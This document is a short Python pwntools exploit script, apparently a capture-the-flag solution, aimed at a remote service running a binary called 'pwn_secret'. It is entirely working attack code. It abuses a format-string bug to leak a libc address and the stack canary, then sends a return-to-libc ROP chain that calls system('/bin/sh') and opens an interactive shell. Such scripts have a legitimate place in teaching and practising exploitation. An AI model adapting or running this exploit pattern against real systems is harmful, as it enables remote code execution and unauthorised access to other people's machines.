from pwn import *

e = ELF('pwn_secret')
libc = ELF('libc-2.23.so', checksec=False)

io = remote('34.107.12.125', 31670)

io.sendline('%2$lx-%11$lx')
io.recvline()
leak = io.recvline()
libc.address = int(leak.strip().split('-')[0], 16) - 0x3c6780 # '-'
canary = int(leak.strip().split('-')[1], 16)

log.info("Libc: %s" % hex(libc.address))
log.info("Canary: %s" % hex(canary))

payload = flat(
        "A"*24,
        canary,
        "A"*8,
        libc.address + 0x0000000000021102, # pop rdi; ret
        next(libc.search('/bin/sh')),
        libc.sym['system'],
        endianness = 'little', word_size = 64, sign = False)

io.recv()
io.sendline(payload)
io.interactive()
